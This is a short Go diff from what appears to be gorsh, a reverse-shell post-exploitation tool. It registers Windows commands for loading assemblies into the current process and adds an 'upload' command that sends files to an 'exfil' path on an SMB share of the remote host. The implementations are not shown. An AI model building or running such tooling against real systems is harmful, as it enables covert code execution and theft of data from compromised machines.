@@ -3,8 +3,8 @@ package cmds
 import (
 	"strings"
 
-	"github.com/abiosoft/ishell"
 	"git.hyrule.link/blink/gorsh/pkg/execute_assembly"
+	"github.com/abiosoft/ishell"
 )
 
 func RegisterWindowsCommands(sh *ishell.Shell) {
@@ -29,7 +29,7 @@ func RegisterWindowsCommands(sh *ishell.Shell) {
 		LongHelp: "Loads an assembly into the current process for later execution",
 		Func:     LoadAssembly,
 		Completer: func([]string) (ass []string) {
-			dirs, _ := execute_assembly.Assemblies.ReadDir("assemblies")
+			dirs, _ := execute_assembly.Assemblies.ReadDir("embed")
 			for _, fsEntry := range dirs {
 				base := strings.Split(fsEntry.Name(), ".")[0]
 				ass = append(ass, base)
@@ -94,8 +94,15 @@ func RegisterWindowsCommands(sh *ishell.Shell) {
 
 	sh.AddCmd(&ishell.Cmd{
 		Name:     "download",
-		Help:     "download from config'd share",
-		LongHelp: "Default download from smb share: '//$RHOST/c'",
+		Help:     "download <share/file> [out.file]",
+		LongHelp: "Default download from smb share: '//${RHOST}/t/'",
 		Func:     Download,
+	})
+
+	sh.AddCmd(&ishell.Cmd{
+		Name:     "upload",
+		Help:     "upload <local> [exfil/out.file]",
+		LongHelp: "Default download from smb share: '//${RHOST}/e/'",
+		Func:     Upload,
 	})
 }
